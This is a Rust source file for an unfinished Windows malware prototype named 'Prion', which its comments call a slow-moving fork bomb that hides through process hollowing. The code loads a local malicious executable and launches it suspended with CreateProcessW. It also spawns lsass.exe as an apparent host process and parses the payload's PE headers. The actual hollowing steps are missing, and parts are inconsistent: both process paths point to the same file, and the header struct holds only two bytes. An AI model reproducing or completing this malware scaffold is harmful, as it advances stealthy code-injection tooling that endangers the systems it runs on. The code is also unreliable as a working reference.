//Prion is a slow-moving fork bomb which tries to hide using process hollowing
//Created for self-educational purposes - DO NOT RUN OR DISTRIBUTE!
#![allow(unused_imports)]

use std::process::{Command, Stdio};
use std::{thread, time, env};
use std::vec::Vec;
use std::fs::File;
use std::io::prelude::*;
use std::ptr::null;
use std::str::from_utf8;
use std::string::String;
use std::ffi::CString;
use std::mem;

extern crate subprocess;
use subprocess::{Popen, PopenConfig, Exec};

extern crate kernel32;
//use kernel32::CreateProcessW;

extern crate winapi;
use std::ffi::OsStr;
use std::iter::once;
use std::os::windows::ffi::OsStrExt;
use std::ptr::null_mut;
use winapi::um::winuser::{MB_OK, MessageBoxW};
use winapi::um::winbase::{CREATE_SUSPENDED, DETACHED_PROCESS, CREATE_NEW_PROCESS_GROUP};
use winapi::um::libloaderapi::{GetModuleHandleA, GetProcAddress};
use winapi::um::processthreadsapi::{CreateProcessW, LPPROCESS_INFORMATION, PROCESS_INFORMATION, STARTUPINFOW};
//use winapi::shared::ntdef::FALSE;
use winapi::shared::minwindef::{FALSE, DWORD};

extern crate bytes;
use bytes::Bytes;

extern crate byteorder;
use byteorder::{ByteOrder, BigEndian, LittleEndian};

extern crate pelite;
use pelite::pe64::{Pe, PeFile};
use pelite::image::IMAGE_DOS_HEADER;

struct ProcessData {
	pidh : u8,
	pinh : u8
}

/*
pData -> mal_buf
pidh -> dos_head
pinh -> nt_head
pish -> section_head
si -> startup_info
pi -> process_info

*/

fn main() {
	
	//Read the malicious executable into a buffer
	let mut mal_buf = Vec::new();
	let mut mal_file = File::open("C:\\Users\\Emily\\Documents\\mal\\mal.exe").expect("Error opening file.\n");
	mal_file.read_to_end(&mut mal_buf).expect("Error reading file contents into buffer.\n");
	
	//println!("File:\n{:?}\n", mal_file);
	//println!("Buf contents:\n{:?}\n", mal_buf);
	
	//let mut mal_proc = Exec::shell("C:\\Users\\Emily\\Documents\\mal\\mal.exe").detached();

	let mut legit_path: Vec<u16> = OsStr::new("C:\\Users\\Emily\\Documents\\mal\\mal.exe").encode_wide().chain(once(0)).collect();
	let mut mal_path: Vec<u16> = OsStr::new("C:\\Users\\Emily\\Documents\\mal\\mal.exe").encode_wide().chain(once(0)).collect();
	
	let mut proc_info = PROCESS_INFORMATION {
            hProcess: null_mut(),
            hThread: null_mut(),
            dwProcessId: 0,
            dwThreadId: 0,
	};
	
	let mut startup_info : STARTUPINFOW = unsafe { mem::zeroed() };
	startup_info.cb = mem::size_of::<STARTUPINFOW>() as DWORD;
	
	let mal_proc = unsafe { 
						CreateProcessW (null_mut(),
										//legit_path.as_mut_ptr(),
										mal_path.as_mut_ptr(),
										null_mut(), null_mut(), FALSE,
										//Create thread in suspended state
										//0x00000004,
										//0x00000010,
										CREATE_SUSPENDED,
										null_mut(), null_mut(),
										&mut startup_info, &mut proc_info);						
							};
	
	let mut legit_proc = Exec::shell("C:\\windows\\system32\\lsass.exe").detached();
	//legit_proc.popen();
	
	let mal_data = ProcessData{pidh : mal_buf[0], pinh : mal_buf[1]};
	
	let mal_pe = PeFile::from_bytes(&mal_buf).unwrap();
	let dos_head = mal_pe.dos_header();
	let nt_head = mal_pe.nt_headers();
	let section_head = mal_pe.section_headers();
	
	println!("PE e_magic:{:?}\n", mal_pe.dos_header().e_magic);
	
	println!("legit_proc:\n{:?}\n", legit_proc);
	
	println!("mal_proc:\n{:?}\n", mal_proc);
	
	thread::sleep(time::Duration::from_millis(10000));
	
	println!("mal process created in suspended state.\n");
	println!("Process data:\npidh: {:?}\npinh: {:?}", mal_data.pidh, mal_data.pinh)
	
}

